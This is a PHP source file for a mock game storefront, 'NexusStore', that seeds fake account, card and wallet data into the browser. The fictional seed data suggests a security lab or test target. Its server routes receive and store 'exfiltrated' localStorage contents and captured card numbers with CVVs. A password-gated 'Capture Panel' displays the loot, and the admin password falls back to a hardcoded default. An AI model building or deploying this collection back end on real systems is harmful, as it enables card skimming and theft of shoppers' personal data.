<?php
declare(strict_types=1);
session_start();
require __DIR__ . '/../src/db.php';

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('Referrer-Policy: same-origin');

$route = (string) ($_GET['r'] ?? '');

// ── POST /?r=grab — store exfiltrated localStorage data ─────────────────────
if ($route === 'grab') {
    header('Content-Type: application/json; charset=utf-8');
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $raw = file_get_contents('php://input');
        $ip  = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '');
        $ua  = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
        if ($raw !== '') {
            db()->prepare('INSERT INTO data_grabs (raw_data, ip, user_agent) VALUES (?, ?, ?)')
               ->execute([$raw, $ip, $ua]);
        }
    }
    echo json_encode(['status' => 'ok']);
    exit;
}

// ── POST /?r=card — store captured card ────────────────────────────────────
if ($route === 'card') {
    header('Content-Type: application/json; charset=utf-8');
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $body = json_decode((string) file_get_contents('php://input'), true) ?? [];
        $ip   = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '');
        $ua   = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
        $num  = preg_replace('/\s+/', '', (string) ($body['number'] ?? ''));
        $exp  = (string) ($body['expiry'] ?? '');
        $cvv  = (string) ($body['cvv'] ?? '');
        $name = (string) ($body['name'] ?? '');
        if ($num !== '') {
            db()->prepare('INSERT INTO card_captures (card_number, expiry, cvv, name, ip, user_agent) VALUES (?, ?, ?, ?, ?, ?)')
               ->execute([$num, $exp, $cvv, $name, $ip, $ua]);
        }
    }
    echo json_encode(['status' => 'ok']);
    exit;
}

// ── GET /?r=admin — admin panel ─────────────────────────────────────────────
if ($route === 'admin') {
    $pw = (string) ($_POST['pw'] ?? '');
    $env_pw = (string) (getenv('ADMIN_PASSWORD') ?: 'nexus2026');
    if ($pw !== '' && hash_equals($env_pw, $pw)) {
        $_SESSION['nexus_admin'] = true;
    }
    if (!($_SESSION['nexus_admin'] ?? false)) {
        ?>
<!doctype html><html lang="en"><head><meta charset="UTF-8"><title>Admin</title>
<style>body{background:#0a0c14;color:#e2e8f0;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}form{background:#0e1320;border:1px solid #1e2740;border-radius:12px;padding:2rem;display:flex;flex-direction:column;gap:1rem;min-width:280px}input,button{padding:.6rem 1rem;border-radius:8px;border:1px solid #1e2740;background:#080b12;color:#e2e8f0;font-size:1rem}button{background:#7c3aed;border:none;cursor:pointer;font-weight:700}</style>
</head><body>
<form method="post"><h2 style="margin:0;font-size:1.1rem">NexusStore Admin</h2>
<input type="password" name="pw" placeholder="Password" autofocus>
<button type="submit">Enter</button></form></body></html>
        <?php exit;
    }

    $grabs = get_data_grabs();
    $cards = get_card_captures();
    ?>
<!doctype html><html lang="en"><head><meta charset="UTF-8"><title>NexusStore — Admin</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#080b12;color:#e2e8f0;font-family:'Inter',system-ui,sans-serif;padding:2rem}
h1{font-size:1.4rem;margin-bottom:1.5rem;color:#06b6d4}
h2{font-size:1rem;margin:2rem 0 .75rem;color:#94a3b8;text-transform:uppercase;letter-spacing:.08em}
table{width:100%;border-collapse:collapse;font-size:.8rem;margin-bottom:1.5rem}
th,td{text-align:left;padding:.5rem .75rem;border-bottom:1px solid #1e2740}
th{color:#64748b;font-weight:600}
td{color:#cbd5e1;word-break:break-all}
pre{background:#0e1320;border:1px solid #1e2740;border-radius:6px;padding:.75rem;font-size:.72rem;overflow-x:auto;white-space:pre-wrap;max-width:600px}
.badge{display:inline-block;padding:.15rem .5rem;border-radius:4px;font-size:.7rem;font-weight:700;background:#7c3aed;color:#fff}
</style></head><body>
<h1>NexusStore — Capture Panel</h1>

<h2>Card Captures (<?= count($cards) ?>)</h2>
<table>
<tr><th>#</th><th>Card</th><th>Expiry</th><th>CVV</th><th>Name</th><th>IP</th><th>Time</th></tr>
<?php foreach ($cards as $c): ?>
<tr>
  <td><?= $c['id'] ?></td>
  <td><span class="badge"><?= htmlspecialchars(substr($c['card_number'], 0, 4)) ?> ···· <?= htmlspecialchars(substr($c['card_number'], -4)) ?></span></td>
  <td><?= htmlspecialchars($c['expiry']) ?></td>
  <td><?= htmlspecialchars($c['cvv']) ?></td>
  <td><?= htmlspecialchars($c['name']) ?></td>
  <td><?= htmlspecialchars($c['ip']) ?></td>
  <td><?= htmlspecialchars($c['created_at']) ?></td>
</tr>
<?php endforeach; ?>
</table>

<h2>Data Grabs (<?= count($grabs) ?>)</h2>
<table>
<tr><th>#</th><th>IP</th><th>Time</th><th>Payload</th></tr>
<?php foreach ($grabs as $g):
    $parsed = json_decode($g['raw_data'], true);
    $vault  = $parsed['vault'] ?? $parsed;
    $user   = $vault['user']['name'] ?? '—';
    $cards_count = count($vault['cards'] ?? []);
    $orders_count = count($vault['orders'] ?? []);
    $bal = isset($vault['wallet']['balance']) ? '$' . number_format($vault['wallet']['balance'] / 100, 2) : '—';
?>
<tr>
  <td><?= $g['id'] ?></td>
  <td><?= htmlspecialchars($g['ip']) ?></td>
  <td><?= htmlspecialchars($g['created_at']) ?></td>
  <td>
    <strong><?= htmlspecialchars($user) ?></strong> · <?= $cards_count ?> cards · <?= $orders_count ?> orders · bal <?= $bal ?><br>
    <pre><?= htmlspecialchars(substr($g['raw_data'], 0, 400)) ?></pre>
  </td>
</tr>
<?php endforeach; ?>
</table>
</body></html>
    <?php exit;
}

// ── GET / — serve NexusStore catalog ────────────────────────────────────────
header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NexusStore</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap">
<style>
:root{--bg:#080b12;--surf:#0e1320;--border:#1e2740;--accent:#7c3aed;--accent2:#06b6d4;--text:#e2e8f0;--muted:#64748b;--sub:#94a3b8;--gold:#f59e0b;--ok:#10b981}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}

/* NAV */
nav{position:sticky;top:0;z-index:50;background:rgba(8,11,18,.95);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:.7rem 1.5rem;display:flex;align-items:center;gap:1.25rem}
.logo{font-size:1.1rem;font-weight:800;letter-spacing:-.02em;color:var(--text);display:flex;align-items:center;gap:.5rem}
.logo-dot{width:28px;height:28px;border-radius:7px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:14px}
.nav-links{display:flex;gap:1.25rem;flex:1}
.nav-links a{font-size:.82rem;font-weight:500;color:var(--muted);text-decoration:none}
.nav-links a.active{color:var(--accent2)}
.account-chip{display:flex;align-items:center;gap:.5rem;background:var(--surf);border:1px solid var(--border);border-radius:999px;padding:.3rem .75rem .3rem .4rem;cursor:default}
.account-avatar{width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:#fff}
.account-name{font-size:.78rem;font-weight:600;color:var(--text)}
.account-tier{font-size:.65rem;font-weight:600;color:var(--gold);margin-left:.2rem}

/* HERO */
.hero{position:relative;overflow:hidden;background:linear-gradient(135deg,#1a0533 0%,#0d1a3a 50%,#001a1a 100%);padding:3.5rem 1.5rem;display:flex;align-items:center;gap:3rem}
.hero-art{position:absolute;inset:0;background:radial-gradient(ellipse 60% 60% at 70% 50%,rgba(239,68,68,.2) 0%,transparent 70%),radial-gradient(ellipse 40% 40% at 20% 60%,rgba(124,58,237,.25) 0%,transparent 70%);pointer-events:none}
.hero-content{position:relative;max-width:520px}
.hero-badge{display:inline-flex;align-items:center;gap:.35rem;background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.3);border-radius:999px;padding:.25rem .75rem;font-size:.7rem;font-weight:700;color:#ef4444;letter-spacing:.06em;text-transform:uppercase;margin-bottom:.9rem}
.hero-title{font-size:2.4rem;font-weight:900;line-height:1.1;letter-spacing:-.03em;text-shadow:0 0 40px rgba(239,68,68,.4)}
.hero-sub{font-size:.9rem;color:var(--sub);margin-top:.6rem;line-height:1.6}
.hero-meta{display:flex;align-items:center;gap:1rem;margin-top:1rem;font-size:.8rem;color:var(--muted)}
.hero-score{color:var(--gold);font-weight:700}
.hero-btn{display:inline-flex;align-items:center;gap:.5rem;margin-top:1.5rem;padding:.8rem 1.75rem;background:linear-gradient(135deg,var(--accent),#5b21b6);color:#fff;border:none;border-radius:10px;font-family:inherit;font-size:.9rem;font-weight:700;text-decoration:none;cursor:pointer;box-shadow:0 4px 20px rgba(124,58,237,.4);transition:filter .2s}
.hero-btn:hover{filter:brightness(1.1)}

/* SECTIONS */
.page{max-width:1200px;margin:0 auto;padding:2.5rem 1.5rem 4rem}
.section-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.25rem}
.section-title{font-size:1rem;font-weight:700;color:var(--text)}
.section-link{font-size:.78rem;color:var(--accent2);text-decoration:none}

/* GAME GRID */
.game-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.25rem}
.game-card{background:var(--surf);border:1px solid var(--border);border-radius:14px;overflow:hidden;cursor:pointer;transition:border-color .2s,transform .2s;text-decoration:none;display:block}
.game-card:hover{border-color:var(--accent);transform:translateY(-2px)}
.game-card-cover{height:140px;position:relative;overflow:hidden}
.gc1{background:linear-gradient(135deg,#1a0533,#0d1a3a)}
.gc2{background:linear-gradient(135deg,#0d1a0a,#1a3a0d)}
.gc3{background:linear-gradient(135deg,#1a1a00,#3a3a0d)}
.gc4{background:linear-gradient(135deg,#1a0a00,#3a1a0d)}
.game-card-cover-art{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:3rem;opacity:.6}
.game-card-badge{position:absolute;top:.5rem;right:.5rem;font-size:.65rem;font-weight:700;padding:.2rem .5rem;border-radius:4px;background:var(--accent);color:#fff}
.game-card-body{padding:.9rem}
.game-card-title{font-size:.88rem;font-weight:700;color:var(--text);line-height:1.3}
.game-card-genre{font-size:.72rem;color:var(--muted);margin-top:.2rem}
.game-card-price{margin-top:.7rem;display:flex;align-items:center;gap:.5rem}
.price-new{font-size:.95rem;font-weight:700;color:var(--text)}
.price-old{font-size:.78rem;color:var(--muted);text-decoration:line-through}
.price-pct{font-size:.68rem;font-weight:700;color:var(--ok);background:rgba(16,185,129,.12);padding:.1rem .35rem;border-radius:4px}

/* LIBRARY */
.library-row{display:flex;flex-direction:column;gap:.6rem}
.lib-item{display:flex;align-items:center;gap:1rem;background:var(--surf);border:1px solid var(--border);border-radius:12px;padding:.8rem 1rem}
.lib-cover{width:48px;height:48px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0}
.lib-info{flex:1;min-width:0}
.lib-title{font-size:.85rem;font-weight:600;color:var(--text)}
.lib-hours{font-size:.72rem;color:var(--muted);margin-top:.15rem}
.lib-play{font-size:.72rem;font-weight:600;color:var(--accent2);cursor:default}

/* WALLET STRIP */
.wallet-strip{background:var(--surf);border:1px solid var(--border);border-radius:14px;padding:1.1rem 1.25rem;display:flex;align-items:center;gap:1rem;margin-bottom:2rem}
.wallet-icon{width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:1.1rem;flex-shrink:0}
.wallet-label{font-size:.7rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
.wallet-card{font-size:.95rem;font-weight:700;color:var(--text)}
.wallet-sep{width:1px;height:32px;background:var(--border);margin:0 .25rem}
.wallet-bal-label{font-size:.7rem;color:var(--muted)}
.wallet-bal{font-size:.95rem;font-weight:700;color:var(--ok)}
</style>
</head>
<body>

<nav>
  <div class="logo"><div class="logo-dot">🎮</div>NexusStore</div>
  <div class="nav-links">
    <a href="/" class="active">Store</a>
    <a href="#">New Releases</a>
    <a href="#">Top Sellers</a>
    <a href="#">Categories</a>
  </div>
  <div class="account-chip" id="accountChip">
    <div class="account-avatar" id="accountAvatar">A</div>
    <span class="account-name" id="accountName">Alex Torres</span>
    <span class="account-tier" id="accountTier">★ Gold</span>
  </div>
</nav>

<div class="hero">
  <div class="hero-art"></div>
  <div class="hero-content">
    <div class="hero-badge">🔥 Featured New Release</div>
    <div class="hero-title">DOOM: THE<br>DARK AGES</div>
    <div class="hero-sub">Definitive Edition · 60+ hours of dark fantasy carnage across haunted medieval battlefields</div>
    <div class="hero-meta">
      <span class="hero-score">★ 9.6 / 10</span>
      <span>Metacritic 96</span>
      <span>M 17+</span>
      <span>Action FPS</span>
    </div>
    <a href="/game.html" class="hero-btn">🛒 Buy Now — $59.99</a>
  </div>
</div>

<div class="page">

  <div class="wallet-strip">
    <div class="wallet-icon">💳</div>
    <div>
      <div class="wallet-label">Saved Payment</div>
      <div class="wallet-card" id="walletCard">Visa •••• 7712 · Chase</div>
    </div>
    <div class="wallet-sep"></div>
    <div>
      <div class="wallet-bal-label">Wallet Balance</div>
      <div class="wallet-bal" id="walletBal">$150.00</div>
    </div>
  </div>

  <div style="margin-bottom:2.5rem">
    <div class="section-hdr">
      <div class="section-title">New Releases</div>
      <a href="#" class="section-link">View all →</a>
    </div>
    <div class="game-grid">
      <a href="/game.html" class="game-card">
        <div class="game-card-cover gc1">
          <div class="game-card-cover-art">💀</div>
          <div class="game-card-badge">New</div>
        </div>
        <div class="game-card-body">
          <div class="game-card-title">Doom: The Dark Ages</div>
          <div class="game-card-genre">Action FPS · id Software</div>
          <div class="game-card-price">
            <span class="price-new">$59.99</span>
            <span class="price-old">$79.99</span>
            <span class="price-pct">-25%</span>
          </div>
        </div>
      </a>
      <a href="#" class="game-card">
        <div class="game-card-cover gc2">
          <div class="game-card-cover-art">🗡️</div>
        </div>
        <div class="game-card-body">
          <div class="game-card-title">Elden Ring: Shadow Realms</div>
          <div class="game-card-genre">Action RPG · FromSoftware</div>
          <div class="game-card-price">
            <span class="price-new">$54.99</span>
          </div>
        </div>
      </a>
      <a href="#" class="game-card">
        <div class="game-card-cover gc3">
          <div class="game-card-cover-art">🤖</div>
          <div class="game-card-badge" style="background:#f59e0b">Top</div>
        </div>
        <div class="game-card-body">
          <div class="game-card-title">Cyberpunk 2077: Phantom City</div>
          <div class="game-card-genre">Open World · CD Projekt</div>
          <div class="game-card-price">
            <span class="price-new">$39.99</span>
            <span class="price-old">$59.99</span>
            <span class="price-pct">-33%</span>
          </div>
        </div>
      </a>
      <a href="#" class="game-card">
        <div class="game-card-cover gc4">
          <div class="game-card-cover-art">🦋</div>
        </div>
        <div class="game-card-body">
          <div class="game-card-title">Hollow Knight: Silksong</div>
          <div class="game-card-genre">Metroidvania · Team Cherry</div>
          <div class="game-card-price">
            <span class="price-new">$29.99</span>
          </div>
        </div>
      </a>
    </div>
  </div>

  <div>
    <div class="section-hdr">
      <div class="section-title">Your Library</div>
      <a href="#" class="section-link">Manage library →</a>
    </div>
    <div class="library-row" id="libraryRow">
      <div class="lib-item">
        <div class="lib-cover gc2">🗡️</div>
        <div class="lib-info">
          <div class="lib-title">Elden Ring: Shadow Realms</div>
          <div class="lib-hours">211 hrs played</div>
        </div>
        <div class="lib-play">▶ Play</div>
      </div>
      <div class="lib-item">
        <div class="lib-cover gc3">🤖</div>
        <div class="lib-info">
          <div class="lib-title">Cyberpunk 2077: Phantom City</div>
          <div class="lib-hours">87 hrs played</div>
        </div>
        <div class="lib-play">▶ Play</div>
      </div>
      <div class="lib-item">
        <div class="lib-cover gc4">🦋</div>
        <div class="lib-info">
          <div class="lib-title">Hollow Knight: Silksong</div>
          <div class="lib-hours">34 hrs played</div>
        </div>
        <div class="lib-play">▶ Play</div>
      </div>
    </div>
  </div>

</div>

<script>
(function () {
  var KEY = 'gstore.v1';

  var SEED = {
    user:    { name: 'Alex Torres', uid: 'u_7742', tier: 'Gold', avatar: 'AT' },
    wallet:  { balance: 15000 },
    cards: [
      { id: 'c1', last4: '7712', brand: 'Visa', bank: 'Chase', expiry: '11/2029', default: true },
      { id: 'c2', last4: '2290', brand: 'Mastercard', bank: 'Citibank', expiry: '05/2027', default: false }
    ],
    library: [
      { id: 'g1', title: 'Elden Ring: Shadow Realms', hours: 211, added: '2026-09-20' },
      { id: 'g2', title: 'Cyberpunk 2077: Phantom City', hours: 87, added: '2026-10-05' },
      { id: 'g3', title: 'Hollow Knight: Silksong', hours: 34, added: '2026-09-30' }
    ],
    orders: [
      { id: 'ORD-20291', title: 'Elden Ring: Shadow Realms', amount: 5499, date: '2026-09-20' },
      { id: 'ORD-20187', title: 'Cyberpunk 2077: Phantom City', amount: 5999, date: '2026-10-05' },
      { id: 'ORD-20144', title: 'Hollow Knight: Silksong', amount: 2999, date: '2026-09-30' }
    ]
  };

  try {
    if (!localStorage.getItem(KEY)) {
      localStorage.setItem(KEY, JSON.stringify(SEED));
    }
    var stored = JSON.parse(localStorage.getItem(KEY));
    var card = stored.cards.find(function(c){ return c.default; }) || stored.cards[0];
    var bal  = stored.wallet.balance;

    document.getElementById('accountName').textContent = stored.user.name;
    document.getElementById('accountTier').textContent = '★ ' + stored.user.tier;
    document.getElementById('accountAvatar').textContent = stored.user.avatar || stored.user.name[0];
    document.getElementById('walletCard').textContent = card.brand + ' •••• ' + card.last4 + ' · ' + card.bank;
    document.getElementById('walletBal').textContent = '$' + (bal / 100).toFixed(2);
  } catch(e) {}
})();
</script>
</body>
</html>
